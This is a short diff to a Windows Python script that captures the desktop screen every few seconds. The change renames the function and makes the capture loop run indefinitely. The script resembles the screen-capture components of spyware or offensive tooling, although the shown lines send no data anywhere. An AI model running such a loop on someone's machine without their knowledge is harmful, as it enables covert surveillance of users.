@@ -16,12 +16,13 @@ import win32ui
 import win32con
 import win32api
 import time
+import itertools
 
 
-def screenshot_taker():
+def win_screenshot_taker():
 
 	while True:
-		for i in range(0, 999):
+		for i in itertools.count():
 			# Grab a handle to the main desktop window
 			fg_window = win32gui.GetDesktopWindow()
 
@@ -56,5 +57,5 @@ def screenshot_taker():
 			time.sleep(3)
 
 
-screenshot_taker()
+win_screenshot_taker()
 
